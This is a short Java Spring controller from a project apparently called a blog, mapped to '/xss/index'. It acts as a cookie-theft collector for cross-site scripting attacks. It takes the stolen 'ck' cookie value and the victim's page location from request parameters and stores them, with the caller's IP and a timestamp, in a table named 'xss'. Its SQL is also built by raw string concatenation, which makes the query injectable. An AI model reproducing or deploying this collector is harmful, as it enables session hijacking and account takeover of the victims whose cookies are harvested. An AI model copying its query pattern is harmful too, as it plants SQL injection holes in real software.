package com.fourfire.blog.controller;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import com.fourfire.blog.dao.impl.BaseDaoImpl;
import com.fourfire.blog.util.Tools;

@Controller
@RequestMapping(value="/xss")
public class XSS{
	@Resource(name="articleDaoImpl")
	private BaseDaoImpl db;

	@RequestMapping(value="/index")
	public void indexView(HttpServletRequest request,HttpServletResponse response){
		String location=request.getParameter("location");
		String cookie=request.getParameter("ck");
		if(cookie!=null){
			String sql="insert into xss values(null,'"+location+"','"+cookie+"','"+request.getRemoteAddr()+"','"+Tools.getTime()+"')";
			db.update(sql);
		}
	 }
}
